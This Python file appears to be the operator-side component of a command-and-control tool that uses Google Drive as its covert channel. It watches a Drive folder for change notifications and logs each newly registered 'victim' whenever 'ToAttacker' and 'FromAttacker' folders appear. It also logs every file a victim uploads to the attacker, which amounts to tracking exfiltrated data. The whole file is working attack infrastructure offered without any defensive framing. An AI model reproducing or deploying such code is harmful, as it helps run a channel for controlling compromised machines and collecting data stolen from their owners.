import multiprocessing
from http.server import BaseHTTPRequestHandler, HTTPServer
import logging
from logging.handlers import QueueHandler
from logger import init_notif_server, logger, debug_global
from drive_functions import stop_watching, get_service, retrieve_changes, authorize, build, start_watching
from config import ROOT_FOLDER

proc = None
drive_service = None
channel_id = None
resource_id = None
queue = None
startPageToken = None

def start_listen(url):
    global proc
    global drive_service
    global channel_id
    global resource_id
    if proc is not None: pass
    drive_service = get_service()
    queue = multiprocessing.Queue()
    init_notif_server(queue)
    channel_id, resource_id, token = start_watching(drive_service, url, ROOT_FOLDER)
    proc = multiprocessing.Process(target=server_main, args=(url, queue, token, channel_id, debug_global))
    logger().info("Starting notification server at {}...".format(url))
    proc.start()


def send_kill():
    global proc
    global channel_id
    global drive_service
    global resource_id
    p = proc
    if proc is not None:
        stop_watching(drive_service, channel_id, resource_id, ROOT_FOLDER)
        proc.terminate()
        proc = None
    return p


def server_main(url, queue, token, channel, debug):
    """
    :param url: the base url on which to listen for notifications
    :param queue: the queue to feed messages into
    - get current list of all victims
    - start listening
    """
    global drive_service
    global startPageToken
    global channel_id
    startPageToken = token
    channel_id = channel
    creds = authorize()
    service = build('drive', 'v3', credentials=creds)
    drive_service = service
    httpd = HTTPServer(("localhost", 8080), NotificationHandler)
    qh = QueueHandler(queue)
    qh.setLevel(logging.DEBUG if debug else logging.INFO)
    logging.getLogger("notif_logger").addHandler(qh)
    logging.getLogger("notif_logger").setLevel(logging.DEBUG if debug else logging.INFO)
    httpd.serve_forever()


class NotificationHandler(BaseHTTPRequestHandler):
    def check_new_victim(self, change_list):
        ToAttackerFound = False
        FromAttackerFound = False
        Victim_Name = None
        if change_list != None:
            if len(change_list) == 3:
                for change in change_list:
                    if change.get('file') is None:
                        return
                    if change.get('file').get('name') == "ToAttacker" and change.get('removed') is False:
                        ToAttackerFound = True
                    elif change.get('file').get('name') == "FromAttacker" and change.get('removed') is False:
                        FromAttackerFound = True
                    elif change.get('removed') is False:
                        Victim_Name = change.get('file').get('name')
                if ToAttackerFound and FromAttackerFound and Victim_Name is not None:
                    logging.getLogger("notif_logger").info("New Victim Added! Victim's Name = {}".format(Victim_Name))

    def check_new_files(self, drive_service, change_list):
        if change_list is not None:
            if len(change_list) == 1 or len(change_list) == 2:
                for change in change_list:
                    if not change.get('removed'):
                        fileId = change.get('fileId')
                        parent = drive_service.files().get(fileId=fileId, fields="parents").execute()
                        if parent.get('parents') is None:
                            continue
                        parent_data = drive_service.files().get(fileId=parent.get('parents')[0]).execute()
                        if parent_data.get('name') == "ToAttacker":
                            victim = drive_service.files().get(fileId=parent_data.get('id'), fields="parents").execute()
                            victim_data = drive_service.files().get(fileId=victim.get('parents')[0]).execute()
                            # logging.getLogger("notif_logger").info(victim_data.get('name'))
                            logging.getLogger("notif_logger").info("Victim " + victim_data.get('name') + " uploaded file: " + change.get('file').get('name'))

    def do_GET(self):
        self.send_error(403)
        self.end_headers()

    def do_POST(self):
        global drive_service
        global startPageToken
        global channel_id
        logging.getLogger("notif_logger").debug("POST RECEIVED")
        self.send_response(200)
        self.end_headers()
        if self.headers["X-Goog-Channel-ID"] == channel_id:
            startPageToken, change_list = retrieve_changes(drive_service, startPageToken)
            self.check_new_victim(change_list)
            self.check_new_files(drive_service, change_list)

    def log_message(self, format, *args):
        return
